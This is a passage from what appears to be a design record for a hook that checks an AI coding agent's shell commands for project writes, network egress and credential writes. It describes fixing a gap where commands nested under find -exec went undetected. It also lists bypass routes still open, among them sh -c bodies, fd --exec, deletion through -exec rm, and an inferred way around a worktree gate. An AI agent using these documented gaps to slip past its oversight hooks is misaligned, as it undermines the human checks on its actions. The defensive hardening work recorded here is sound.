find . -name x | xargs cp -t src                         -> local /proj/src      (control, cycle P)
find . -name x -exec cp {} src/y.py \; ; cp seed.txt src/z.py
                                                         -> local /proj/src/z.py (control)
```

The third control is the one that mattered: only the nested command was lost, and the
segmentation around the construct was already intact.

Re-measured after the fix, same harness, same `WRIT_CWD`: the first six rows yield the
nested command's own destination (`local /proj/src/y.py`, and `local /proj/src` for the
`-t src` batch row), the `tee` and `sed -i` rows yield `local /proj/src/y.py`, the `curl`
row yields the egress host `example.invalid`, `-print` is still silent, the `xargs` control
is unchanged, and the third control now yields BOTH `local /proj/src/y.py` and
`local /proj/src/z.py`.

### Decision: one splice, not a fifth arm

Each nested-command span is appended to `segments` as an ADDITIONAL entry, piped flag
FALSE, immediately after the segment loop finishes and before any pass runs:

```python
NESTED_CMD_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
NESTED_TERMINATOR_CHARS = frozenset({";", "+"})

for _seg, _piped in list(segments):
    for _span in nested_command_spans(_seg):
        segments.append((_span, False))
```

The write loop then resolves `cmd0 = cp` for that entry and the egress loop resolves
`verb = curl`, with NO change to any write arm, no change to any egress arm and no change
to `verb_at`. The original `find` segment stays in the list: its `cmd0` is `find`, it
matches no arm, and its redirect scan keeps working, so `find ... -exec ... \; > log.txt`
still gates `log.txt`.

The egress half comes free rather than needing a second cycle for exactly one structural
reason: the write pass, the inline-interpreter pass and the egress pass are three loops
over the SAME `segments` list. One splice feeds all three, and the interpreter pass picking
up `find . -exec python3 -c "..." \;` is a third consequence of the same line, pinned as a
capability rather than left as a side effect nobody noticed.

Two alternatives were rejected, and the reasons belong in the record:

- A FIFTH `cmd0` arm for `find` would have to re-implement the destination logic of all
  four existing arms (the `tee` argument loop, `dd of=`, the `cp`/`mv`/`install` last
  positional plus its three `-t` spellings, and `sed -i`'s last positional), and it would
  not touch egress at all, so the transfer half would need its own cycle.
- Refactoring the per-segment body into a shared function callable on a nested span would
  rewrite the code path every existing test in this family runs through, for no coverage
  the splice does not already buy.

The helper sits OUTSIDE the `MIRROR BEGIN/END split_control_operators` block on purpose.
That block is byte-compared across three copies, so putting the splice inside it would
force an identical change to `writ/session/bash_tokens.py` and would change
`writ-worktree-safety.sh` behavior on unmeasured evidence.

### Span boundaries, and why they are reliable

The spans are derived PER SEGMENT, from the already-built list, not from the raw token
stream, which makes a control operator a hard stop for free: a span cannot cross a segment
boundary because the boundary split happened first. A span runs from the token after the
flag to the terminator, or to the END of the segment when there is none.

Every terminator survives tokenization as a distinct token and none of them becomes a
`CONTROL` member. MEASURED token forms: `\;` gives `'\\;'`, `';'` gives `"';'"`, `";"`
gives `'";"'`, and `+` gives `'+'`. A BARE `;` never appears inside a segment at all,
because it IS a `CONTROL` token and has already ended the segment before the splice runs.
The list is SNAPSHOTTED before splicing, so a spliced span is never itself rescanned: one
level is every level find has, and re-entering would be an unbounded loop for no coverage.

### The flag family was undercounted

FOUR flags, which is two more than the header used to name. `-ok` and `-okdir` prompt the
user before each command and then RUN it, so both are write vectors exactly as `-exec` and
`-execdir` are. Both were measured silent, and both were named NOWHERE before this cycle:
not in the header's uncovered block, not in this ADR, not in any test. A disclosure that
misstates the SIZE of a hole is what stops the next reader re-examining it, which is the
same failure the cycle P amendment recorded about a false reason.

No count is pinned anywhere. The new test module derives its flag axis from the hook's own
`NESTED_CMD_FLAGS` and asserts the axis EQUALS that set, so a fifth spelling added later
reddens the axis-equality test instead of sitting outside a stale literal.

### The batch form's real constraint

EXECUTED against GNU findutils 4.9.0 on the implementing machine:

```
find . -maxdepth 0 -name __nomatch__ -exec cp {} dest +
    -> find: missing argument to `-exec'   (exit 1)
find . -maxdepth 0 -name __nomatch__ -ok cp -t dest {} +
    -> find: missing argument to `-ok'     (exit 1)
```

The first says `{}` must be the trailing argument under `+`, so under `+` a destination is
reachable only as a FLAG VALUE (`cp -t DIR {} +`) and NO detector for `cp {} dest +` is
built, because that command can never run. The second was INFERRED by the plan from find's
documentation and is now MEASURED: `+` is rejected for `-ok` as well, so the test module's
batch-terminator axis stays the two flags and does not widen to all four. The `;` family
has no ordering constraint, so a destination may sit anywhere in the nested argument list,
and its consumer set is therefore the wider one.

### Accepted costs

`{}` is find's placeholder, not a path. The two brace discards elsewhere in the hook
(`CODE_PUNCT` in `token_literals`, the brace skip in `scan_tokens`) are on the INTERPRETER
path only, not on the `cmd0` write arms. So a spelling that puts the placeholder in
DESTINATION position emits a row naming the placeholder: MEASURED,
`find . -name x -exec tee {} \;` and `find . -name x -exec sed -i s/a/b/ {} \;` each yield
`local /proj/{}`. Three treatments were weighed and the chosen one is to leave the
placeholder alone and PIN the row:

- Skipping brace-bearing targets globally at the normalization point also changes non-find
  behavior, turning a real `echo x > src/{a}.py` into silence. MEASURED as still collected
  (`local /proj/src/{a}.py`) both before and after this cycle, and pinned, so the
  alternative's cost is executable rather than argued.
- Dropping `{}` tokens out of the span is actively worse for the `sed` arm, whose "last
  positional is the file" heuristic then reads the SCRIPT as the file, and it leaves
  `tee {}` with no argument at all.

The row is fail-closed and strictly better than the silence it replaces: a real in-place
bulk edit now reaches the work gate instead of no gate at all, and the only thing wrong is
the TEXT of a path that no single file can be named for. When the placeholder is a SOURCE
rather than a destination the cost does not arise at all, because the arm takes the last
positional: `-exec cp {} src/y.py \;` yields the real destination.

The second cost is that the flags are matched as a MECHANISM on the RAW token and NOT
conditioned on the segment's verb being `find`, which follows this file's own posture at
`WRAPPER_POSITIONALS`: fail-closed for the verb, fail-open for detection, where an extra
row for a command that never runs is cheaper than a lost row for one that does. The
consequences, both MEASURED and both pinned:

- A QUOTED mention opens no span, because `shlex(posix=False)` leaves the quote characters
  on. `grep -- '-exec cp {} src/y.py' src/notes.txt`, `echo "-exec cp {} src/y.py"` and
  `git commit -m "use -exec cp {} src/y.py"` are all still silent after the fix. This is
  the discrimination the mechanism has to make, and it is the same rule
  `strip_group_opener` applies to a quoted group opener.
- An UNQUOTED mention in any command's arguments DOES open a span, whatever the verb, so
  `echo find . -exec cp {} src/y.py`, `somecmd -exec cp {} src/y.py \;` and
  `myscript --pattern -exec cp {} src/y.py \;` each emit `local /proj/src/y.py` for a
  command that writes nothing. That is the accepted cost, and it survives `\find`, an
  alias, and a wrapper-prefixed find, which conditioning on `verb_at(seg)[0] == "find"`
  would not.

### Deferred, each for a stated reason

- DELETION, by the recorded ruling in the hook's irreversible-destruction block ("rm -rf,
  DROP TABLE and TRUNCATE are OUT OF SCOPE on purpose"). MEASURED after the fix:
  `find . -name x -exec rm {} \;` and `find . -name x -delete` are both still silent,
  because `rm` matches no `cmd0` arm and `-delete` carries no nested command. Both pinned,
  so the closure is not read as smuggling deletion into scope. Neither command matches the
  hook's cheap early-exit globs either, so through the full hook they never even reach the
  extractor: the extractor-level pins are the tighter assertion of the two.
- The worktree gate's OWN exposure. `find . -exec git worktree remove x \;` evading
  `writ-worktree-safety.sh` is INFERRED from that hook's source, not measured, and is
  deferred for exactly the reason cycle P gave for not growing that hook's prefix set: its
  parsing is permissive-only by design and a change there would be a second unmeasured
  change.
- `fd --exec` / `fd -x`. The SAME nested-command mechanism under another tool's flag
  spellings, which `NESTED_CMD_FLAGS` does not carry. NOT MEASURED, so it is recorded as a
  stated suspicion and it takes find's place in the header's names-only block.
- `sh -c` inside a nested command, unchanged. MEASURED still silent:
  `find . -name x -exec sh -c 'cp seed.txt src/y.py' \;` yields nothing, because the body
  is ONE token and no `cmd0` arm matches it. That is the already-disclosed `sh -c` limit,
  not a new one.
- Resolving find's SEARCH ROOT into the placeholder. find's path operands precede its
  expression and may repeat, so this is a separate mechanism and is deliberately not
  attempted. The residue is stated below.

### The residue is executable, not only prose

The placeholder row always resolves under the cwd even when find's search root is
elsewhere, so an out-of-repo bulk in-place edit is reported as `local` rather than
`outside` and does not reach the project-boundary refusal that the DIRECT spelling of the
same write does reach. That asymmetry is a test with the direct spelling beside it as the
contrast, so a future cycle that resolves find's search roots has a red test to turn green
rather than a paragraph to rediscover. It is under-detection relative to a perfect gate and
strictly more detection than the total silence it replaces.

The machine-readable residue grew a second half. The header's names-only block between
`# UNCOVERED PREFIXES BEGIN` and `# UNCOVERED PREFIXES END` no longer names find's flags,
and the ratchet that reads it now derives TWO covered populations: the hook's own
`WRAPPERS` keys AND its own `NESTED_CMD_FLAGS`. Naming a covered prefix as uncovered,
closing a prefix without updating the block, and closing a nested-command FLAG without
updating the block all redden there.

### The order of the changes was itself a trap

Removing find's flags from the names-only block reddens EXACTLY ONE assertion and does NOT
redden the behavior test that asserted `set()`. So the block edit alone would produce a
file whose header reads "closed" while a green behavior test still pinned the hole open.
The block edit, the behavior fix and the rewritten behavior test therefore landed in the
SAME commit, and that was checked explicitly before the commit rather than left to chance.

### Measured versus inferred

MEASURED: the nine silences and the three controls above, before the fix and again after
it, through the extractor with `WRIT_CWD=/proj`; the four terminator token forms; both
findutils 4.9.0 rejections, executed with exit codes; the two placeholder rows
(`local /proj/{}` for `tee {}` and for `sed -i s/a/b/ {}`); the braced-path control
(`echo x > src/{a}.py` still collected); the three quoted mentions staying silent and the
three unquoted mentions emitting a row; the two deletion spellings staying silent; and the
real hook's `permissionDecision` for two nested commands, an egress ask naming the host and
a credential deny carrying `[SEC-CREDENTIAL-WRITE]`.

NOT MEASURED, stated plainly rather than implied: the real hook's `permissionDecision` for
a nested project WRITE, which is proved at the extractor layer only, the same boundary every
earlier cycle in this family recorded; and a write LANDING ON DISK through the full Claude
Code path, which a `PreToolUse` hook test cannot show at all. INFERRED, not measured:
`find . -exec git worktree remove x \;` evading the worktree gate, and `fd --exec` carrying
the same mechanism under a spelling this fix does not cover.
